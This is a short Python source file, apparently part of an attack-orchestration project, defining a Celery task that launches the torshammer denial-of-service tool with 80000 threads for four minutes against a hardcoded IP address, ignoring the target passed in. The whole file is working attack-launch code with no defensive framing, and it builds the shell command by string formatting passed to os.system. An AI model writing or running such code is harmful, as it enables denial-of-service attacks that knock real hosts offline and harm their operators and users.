#
from __future__ import absolute_import
from pexpect import pxssh
import time
import subprocess as sp
import time
import os
import random
import signal
import subprocess
from attacks.celery import app


@app.task
def torshammer(ip_address, port):
    
  #140.30.20.5
  command = "python2.7 torshammer.py -t {} -p {} -r 80000".format("140.30.20.5", port)



  #command = ["python2.7", "torshammer.py", "-t", str(ip_address), "-p", str(port), "-r", "80000"]
  timeout = 240
  os.system(f"( {command} ) & sleep {timeout} ; kill $!")
  #try:
  #results = subprocess.run(command, timeout=60)
  #except subprocess.TimeoutExpired:
  #print("El comando ha excedido el tiempo de espera.")

  print("El comando ha finalizado.")


        